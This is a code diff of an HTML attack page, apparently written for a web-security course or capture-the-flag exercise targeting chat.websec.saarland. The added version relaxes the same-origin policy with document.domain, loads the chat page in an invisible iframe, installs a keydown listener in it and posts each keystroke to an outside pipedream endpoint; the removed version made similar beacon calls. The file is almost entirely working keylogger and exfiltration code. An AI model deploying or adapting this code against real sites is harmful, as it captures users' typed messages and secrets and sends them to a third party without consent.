@@ -1,30 +1,42 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Owley Payload</title>
-</head>
-<body>
-  <h1>Owley Payload Loading 🦉</h1>
+  <head>
+    <title>Owley Logger</title>
+    <script>
+      document.domain = "websec.saarland"; // Relax SOP
 
-  <script>
-    // Demo log to confirm that logging works
-    fetch('https://eooaktfbjo7cto7.m.pipedream.net?demo=payload_loaded');
+      // Function to send logs to your pipedream endpoint
+      function logToServer(data) {
+        fetch("https://eooaktfbjo7cto7.m.pipedream.net", {
+          method: "POST",
+          mode: "no-cors",
+          body: JSON.stringify({ key: data })
+        });
+      }
 
-    // This line will fail on Netlify, expected
-    try {
-      document.domain = 'websec.saarland';
-    } catch (err) {
-      fetch('https://eooaktfbjo7cto7.m.pipedream.net?document_domain_error=' + encodeURIComponent(err.message));
-    }
+      // Set up keylogger after iframe loads
+      function setupKeylogger() {
+        try {
+          const iframe = document.getElementById("chat_frame");
+          const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
 
-    // Try to iframe chat page (will be blocked, but fine for now)
-    const iframe = document.createElement('iframe');
-    iframe.src = 'https://chat.websec.saarland';
-    iframe.style.width = '1px';
-    iframe.style.height = '1px';
-    iframe.style.border = 'none';
-    iframe.style.visibility = 'hidden';
-    document.body.appendChild(iframe);
-  </script>
-</body>
+          // Make sure same domain is set
+          iframe.contentWindow.document.domain = "websec.saarland";
+
+          iframe.contentWindow.addEventListener("keydown", function (e) {
+            logToServer(e.key);
+          });
+
+          // Log success
+          logToServer("Keylogger injected successfully");
+        } catch (e) {
+          logToServer("Error injecting keylogger: " + e.message);
+        }
+      }
+    </script>
+  </head>
+  <body>
+    <h1>Welcome Owley 😈</h1>
+    <iframe id="chat_frame" src="https://chat.websec.saarland" onload="setupKeylogger()" style="width:0;height:0;border:0;"></iframe>
+  </body>
 </html>
